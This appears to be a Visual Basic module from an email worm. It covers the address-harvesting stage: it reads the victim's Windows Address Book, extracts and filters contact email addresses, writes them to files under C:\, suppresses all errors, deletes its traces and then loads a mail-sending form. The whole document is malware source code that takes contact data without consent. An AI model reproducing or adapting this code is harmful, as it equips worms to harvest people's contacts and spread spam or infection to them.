   Attribute VB_Name = "Adres"
   Option Explicit
   Sub main()
   On Error Resume Next
   Dim wab As String
   wab = getstring(HKEY_CURRENT_USER, "Software\Microsoft\WAB\WAB4\Wab File Name", "")
   If wab = "" Or Dir(wab) = "" Then Exit Sub
   Dim q As String
   Dim a As String
   Dim z As Long
   Dim n As Long
   Dim b As Integer
   Dim block() As String * 512
   Kill "C:\Y"
   Open wab For Binary As #1
   Open "C:\Y" For Binary As #2
   n = FileLen(wab) / 512
   ReDim block(n)
   z = 0
   Do Until EOF(1) = True
       Get #1, , block(z)
       q = ""
       For b = 1 To 512
           If b / 2 <> Int(b / 2) And Mid(block(z), b, 1) <> Chr(0) And Mid(block(z), b, 1) <> Chr(32) Then q = q & Mid(block(z), b, 1)
       Next b
       Put #2, , q
       z = z + 1
   Loop
   Close
   Open "C:\Y" For Binary As #1
   Open "C:\E" For Output As #2
   Open "C:\N" For Output As #3
   n = FileLen("C:\Y") / 512
   ReDim block(n)
   z = 0
   a = "a"
   Do Until EOF(1) = True
       Get #1, , block(z)
       For b = 1 To 512
           If Mid(block(z), b, 2) = Chr(221) & Chr(196) Then
               q = Mid(block(z), b + 2, InStr(Mid(block(z), b + 3), Chr(221) & Chr(196)) - 2)
               If InStr(q, Chr(156) & Chr(247) & "X") <> 0 Then q = Mid(q, InStr(q, Chr(156) & Chr(247) & "X") + 6)
               If Left(q, 1) = UCase(Left(q, 1)) Then q = Mid(q, 2)
               If InStr(LCase(q), "hotmail") <> 0 Then
                   q = q & Space(4)
                   Mid(q, InStr(LCase(q), "hotmail")) = "hotmail.com"
                   q = Trim(q)
               End If
               n = 0
               If InStr(LCase(q), ".com") <> 0 Then q = Left(q, InStr(LCase(q), ".com") + 3): n = 1
               If InStr(LCase(q), ".net") <> 0 Then q = Left(q, InStr(LCase(q), ".net") + 3): n = 1
               If InStr(LCase(q), ".org") <> 0 Then q = Left(q, InStr(LCase(q), ".org") + 3): n = 1
               If n = 0 Then
                   For n = Len(q) To 1 Step -1
                       If Left(Right(q, n), 1) = "." Then q = Left(q, n - 1): Exit For
                   Next
               End If
               q = LCase(q)
               If Right(q, 4) = ".com" Or Right(q, 4) = ".net" Or Right(q, 4) = ".org" Or Left(Right(q, 3), 1) = "." Then
                   If InStr(q, "@") <> 0 And InStr(q, "spam") = 0 And InStr(q, "warez") = 0 And InStr(q, "webmaster") = 0 And Len(q) > 9 And q <> a Then
                       For n = 2 To Len(q)
                           If Mid(q, n, 1) = UCase(Mid(q, n, 1)) Then
                               If Mid(q, n, 1) = "." Or Mid(q, n, 1) = "@" Or Mid(q, n, 1) = "_" Or Mid(q, n, 1) = "-" Or Mid(q, n, 1) = "0" Or Mid(q, n, 1) = "1" Or Mid(q, n, 1) = "2" Or Mid(q, n, 1) = "3" Or Mid(q, n, 1) = "4" Or Mid(q, n, 1) = "5" Or Mid(q, n, 1) = "6" Or Mid(q, n, 1) = "7" Or Mid(q, n, 1) = "8" Or Mid(q, n, 1) = "9" Then Else n = 1: Exit For
                           End If
                       Next
                       If Left(q, 1) = "a" Or Left(q, 1) = "b" Or Left(q, 1) = "c" Or Left(q, 1) = "d" Or Left(q, 1) = "e" Or Left(q, 1) = "f" Or Left(q, 1) = "g" Or Left(q, 1) = "h" Or Left(q, 1) = "i" Or Left(q, 1) = "j" Or Left(q, 1) = "k" Or Left(q, 1) = "l" Or Left(q, 1) = "m" Or Left(q, 1) = "n" Or Left(q, 1) = "o" Or Left(q, 1) = "p" Or Left(q, 1) = "q" Or Left(q, 1) = "r" Or Left(q, 1) = "s" Or Left(q, 1) = "t" Or Left(q, 1) = "u" Or Left(q, 1) = "v" Or Left(q, 1) = "w" Or Left(q, 1) = "x" Or Left(q, 1) = "y" Or Left(q, 1) = "z" Then Else q = Mid(q, 2)
                       If InStr(InStr(q, "@") + 1, q, "@") <> 0 Or Left(q, 1) = "0" Or Left(q, 1) = "1" Or Left(q, 1) = "2" Or Left(q, 1) = "3" Or Left(q, 1) = "4" Or Left(q, 1) = "5" Or Left(q, 1) = "6" Or Left(q, 1) = "7" Or Left(q, 1) = "8" Or Left(q, 1) = "9" Then n = 1
                       If n <> 1 Then
                           a = q
                           If Right(q, 2) = "nl" Then Print #3, q Else Print #2, q
                       End If
                   End If
               End If
           End If
       Next b
       z = z + 1
   Loop
   Close
   If Len("C:\E") = 0 Then Kill "C:\E"
   If Len("C:\N") = 0 Then Kill "C:\N"
   Kill "C:\Y"
   Load Mapi
   End Sub
